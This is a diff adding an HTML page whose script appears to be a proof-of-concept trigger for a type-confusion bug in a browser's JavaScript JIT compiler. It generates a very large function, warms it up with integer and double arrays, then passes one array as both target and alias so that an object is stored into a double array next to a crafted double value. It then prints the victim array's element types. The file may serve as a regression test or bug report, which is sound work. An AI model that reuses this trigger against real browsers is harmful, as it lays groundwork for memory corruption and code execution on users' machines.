@@ -1,0 +1,41 @@
+<!doctype html>
+<meta charset="utf-8">
+<script>
+const lines = ["function trigger(x, arr, alias, obj, limit) {"];
+for (let i = 0; i < 650; i++) lines.push(`if (x === ${i}) return ${i};`);
+lines.push("arr[0] = obj;");
+lines.push("let i = 0, res = 0;");
+lines.push("while (i < limit) {");
+lines.push("res = alias[0] + 0.0;");
+for (let i = 0; i < 430; i++) lines.push(`res = (res + i + ${i % 7}) | 0;`);
+lines.push("Array.prototype.push.call(alias, 4.950618252845e-311);");
+lines.push("i++;");
+lines.push("}");
+lines.push("return res;");
+lines.push("}");
+lines.push("return trigger;");
+const trigger = new Function(lines.join("\n"))();
+
+const obj = { marker: 0x1337 };
+function makeSmi() { return [1, 2, 3]; }
+function makeDouble() { return [1.1, 2.2, 3.3]; }
+
+// Seed both transition sources before making the function hot.  The body
+// access executes only with an independent double alias during warmup.
+trigger(1000, makeSmi(), makeDouble(), obj, 1);
+trigger(1000, makeDouble(), makeDouble(), obj, 0);
+for (let i = 0; i < 18000; i++) {
+  trigger(1000, makeSmi(), makeDouble(), obj, 1);
+  trigger(1000, makeDouble(), makeDouble(), obj, 0);
+}
+
+const victim = makeDouble();
+try {
+  const result = trigger(1000, victim, victim, obj, 1);
+  console.log("result", typeof result, result);
+  for (let i = 0; i < 7; i++) console.log("victim" + i, typeof victim[i], victim[i]);
+  console.log("victim length", victim.length);
+} catch (e) {
+  console.log("caught", e && e.name, e && e.message);
+}
+</script>
